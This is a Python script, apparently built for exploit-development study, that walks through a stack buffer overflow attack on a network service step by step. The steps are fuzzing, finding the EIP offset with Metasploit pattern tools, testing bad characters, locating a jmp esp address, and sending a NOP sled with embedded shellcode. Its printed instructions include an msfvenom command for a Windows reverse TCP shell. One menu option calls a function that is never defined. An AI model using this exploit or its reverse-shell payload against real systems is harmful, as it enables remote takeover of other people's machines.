#!/usr/bin/python
import socket
import os
import time, struct, sys

# Usage:
try:
    server = sys.argv[1]
    port = int(sys.argv[2])
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

def totalBytes():
	buffer=["A"]
	counter=100

	while len(buffer) <= 30:
        	buffer.append("A"*counter)
        	counter=counter+200

	for string in buffer:
        	print "Fuzzing PASS with %s bytes" % len(string)
        	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        	connect=s.connect((server ,port))
        	#s.recv(1024)
        	s.send('' + string + '\r\n') #modify per PoC code
		s.recv(1024)
        	s.close()

def requiredBytes():
	buffer=int(raw_input("Enter amount of A's to send that you think crash the service: ")) * "A"
	s =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		print "\nSending Evil buffer..."
                s.connect((server ,port))
                #s.recv(1024)
                s.send('' + buffer + '\r\n') #modify per PoC code
                #s.recv(1024)
                print "\nDone!"
	except:
		print "Could not connect to Target Host"

def uniqueChars():
	num=raw_input("Enter the length of buffer required to crash: ")
	print "[!] Creating unique string using pattern_create"
	patternCreate=os.popen('/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l '+ num).read()
	print "[+] Pattern created\n" + patternCreate

	s =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
        	print "\nSending evil buffer..."
        	s.connect((server, port))
        	#data = s.recv(1024)
        	s.send('' + patternCreate + '\r\n') #modify per PoC code
        	print "\nDone!."
		print "\nCheck the EIP value and note it!"
	except:
        	print "Could not connect to Target Host"

def controlEIP():
	offset=raw_input("Enter the EIP value to get the offset: ")
	patternOffset=os.popen('/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q '+ offset).read()
	offsetNumber=int(filter(str.isdigit, patternOffset)) #filters the string 'offset at 2606' to just '2606'
	print (str(offsetNumber) + "= Offset Number")
	bufferLength=raw_input("Enter the  Length of total bytes required to crash the program: ")
	buffer2='A'*int(offsetNumber) +'B'*4 +'C'*(int(bufferLength)-int(offsetNumber)) #send 4 B's to overwrite EIP with 42424242 
	s =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
        	print "\nSending evil buffer..."
	        s.connect((server, port))
        	#data = s.recv(1024)
	        s.send('' + buffer2 + '\r\n') #modify per PoC code
        	print "\nDone!."
		print "EIP should be 42424242 (B*4)"
	except:
        	print "Could not connect to Target Host"

def baddies():
	unmodifiedList = '''
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
'''
	#Change this one to fire off and check for bad characters
	badChars=(
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

	offsetNumber=raw_input("Enter offset value i.e 2606: ")
	buffer='A'*int(offsetNumber) +'B'*4 + badChars
	s =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
                print "\nSending evil buffer..."
                s.connect((server, port))
                #data = s.recv(1024)
                s.send('' + buffer +'\r\n') #modify per PoC code
                print "\nDone!."
                print "Just sent bad characters. Check to see if any need to be removed! Come back, remove from script and run again!"
        except:
                print "Could not connect to Target Host"

def nasmShell():
	print '''
/usr/share/metasploit-framework/tools/exploit/nasm_shll.rb"
Once it loads, enter 'jmp esp' the value FFE4 is returned - we need this for the mona module in immnuity debugger enter:
'!mona modules'
Find a module that has everything set to false for rebase, safe, aslr and ncompact!

Next, run '!mona find -s "\xff\xe4" -m <name of the module above> i.e something.dll

Or, try !mona jmp -r esp -cpb "<badChars>"

Choose one of the results at the bottom. Right-click. Copy address to clipboard. Save this!

Whatever the address is i.e 5F4A358F this will be reversed little endian when we get to modifying this script later.

Now create a payload:
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -f py -b '<bad characters>' -e x86/shikata_ga_nai | cut -d " " -f3
'''

def findSpace():
	offsetNumber=raw_input("Enter the offset value: ")
        bufferLength=raw_input("Enter number of C's to send (at least 450 more than we know crashes the service): ")
        buffer2='A' * int(offsetNumber) +'B' * 4 + 'C' * (int(bufferLength)-int(offsetNumber)-4)
        print buffer2
	s =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
                print "\nSending evil buffer..."
                s.connect((server, port))
                #data = s.recv(1024)
                s.send('' + buffer2 + '\r\n') #modify per PoC code
                print "\nDone!."
                print "EIP should be 42424242"
		print "Double click address bottom-right at the start of C's and then scroll to last C"
		print "Check the vallue i.e +1AC and convert to find total number of C's we have!"
        except:
                print "Could not connect to Target Host"
def shellCode():
	print "Modify this script. We need the jmp ESP address"
	print "Modify this Script. We need the shellcode"
	#jmpesp examples
	'''
	jmpesp = 5F4A358F
	little endian value = '\x8f\x35\x4a\x5f'
	'''
	
	jmpesp = '\x01\x1d\xd1\x65' # change this
	shellcode=("\xb8\x69\xd6\xd1\xfe\xd9\xc5\xd9\x74\x24\xf4\x5e\x31"
	"\xc9\xb1\x52\x31\x46\x12\x03\x46\x12\x83\x87\x2a\x33"
	"\x0b\xab\x3b\x36\xf4\x53\xbc\x57\x7c\xb6\x8d\x57\x1a"
	"\xb3\xbe\x67\x68\x91\x32\x03\x3c\x01\xc0\x61\xe9\x26"
	"\x61\xcf\xcf\x09\x72\x7c\x33\x08\xf0\x7f\x60\xea\xc9"
	"\x4f\x75\xeb\x0e\xad\x74\xb9\xc7\xb9\x2b\x2d\x63\xf7"
	"\xf7\xc6\x3f\x19\x70\x3b\xf7\x18\x51\xea\x83\x42\x71"
	"\x0d\x47\xff\x38\x15\x84\x3a\xf2\xae\x7e\xb0\x05\x66"
	"\x4f\x39\xa9\x47\x7f\xc8\xb3\x80\xb8\x33\xc6\xf8\xba"
	"\xce\xd1\x3f\xc0\x14\x57\xdb\x62\xde\xcf\x07\x92\x33"
	"\x89\xcc\x98\xf8\xdd\x8a\xbc\xff\x32\xa1\xb9\x74\xb5"
	"\x65\x48\xce\x92\xa1\x10\x94\xbb\xf0\xfc\x7b\xc3\xe2"
	"\x5e\x23\x61\x69\x72\x30\x18\x30\x1b\xf5\x11\xca\xdb"
	"\x91\x22\xb9\xe9\x3e\x99\x55\x42\xb6\x07\xa2\xa5\xed"
	"\xf0\x3c\x58\x0e\x01\x15\x9f\x5a\x51\x0d\x36\xe3\x3a"
	"\xcd\xb7\x36\xec\x9d\x17\xe9\x4d\x4d\xd8\x59\x26\x87"
	"\xd7\x86\x56\xa8\x3d\xaf\xfd\x53\xd6\x10\xa9\x5b\x0f"
	"\xf9\xa8\x5b\x4e\x42\x25\xbd\x3a\xa4\x60\x16\xd3\x5d"
	"\x29\xec\x42\xa1\xe7\x89\x45\x29\x04\x6e\x0b\xda\x61"
	"\x7c\xfc\x2a\x3c\xde\xab\x35\xea\x76\x37\xa7\x71\x86"
	"\x3e\xd4\x2d\xd1\x17\x2a\x24\xb7\x85\x15\x9e\xa5\x57"
	"\xc3\xd9\x6d\x8c\x30\xe7\x6c\x41\x0c\xc3\x7e\x9f\x8d"
	"\x4f\x2a\x4f\xd8\x19\x84\x29\xb2\xeb\x7e\xe0\x69\xa2"
	"\x16\x75\x42\x75\x60\x7a\x8f\x03\x8c\xcb\x66\x52\xb3"
	"\xe4\xee\x52\xcc\x18\x8f\x9d\x07\x99\xbf\xd7\x05\x88"
	"\x57\xbe\xdc\x88\x35\x41\x0b\xce\x43\xc2\xb9\xaf\xb7"
	"\xda\xc8\xaa\xfc\x5c\x21\xc7\x6d\x09\x45\x74\x8d\x18" )
        offsetNumber=raw_input("Enter the offset value: ")
        bufferLength=raw_input("Enter number of C's to send: ")
	shellSize=raw_input("Enter shellcode size in bytes: ")
        buffer='A' * int(offsetNumber) + jmpesp + "\x90" * 16  + shellcode + "C" * (int(bufferLength)-int(offsetNumber)-int(shellSize)-4-16)
	
	s =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
        	print "\nSending evil buffer..."
	        s.connect((server, port))
        	#data = s.recv(1024)
	        s.send('' + buffer + '\r\n') #modify per PoC code
        	print "\nDone!."
	except:
        	print "Could not connect to Target Host"

def menu():
        choice = raw_input('''
       	1: Fuzz A's automatically to find out how many crash the program.
        2: Confirm number of A's (Enter how many to send)
        3: Send a unique string to find out at what point we hit EIP
        4: Send correct amount to control EIP
	5: Forgot what to do...? Print Buffer Overflow Steps
	6: Send payload with BadCharacters (manually remove what you dont want)
	7: Get the address for jmp ESP and generate shellcode (exclude bad characters etc)
	8: Find space for the shellcode i.e How many C's can we send?
	9: Fire the working exploit
        ''')
        if choice == '1':
                totalBytes()
        elif choice == '2':
                requiredBytes()
        elif choice == '3':
                uniqueChars()
        elif choice == '4':
                controlEIP()
	elif choice == '5':
		whatToDo()
	elif choice == '6':
		baddies()
	elif choice == '7':
		nasmShell()
	elif choice == '8':
		findSpace()
	elif choice == '9':
		shellCode()
        else:
		print "Wrong choice, qutting"
		menu()

if __name__ == "__main__":
	menu()
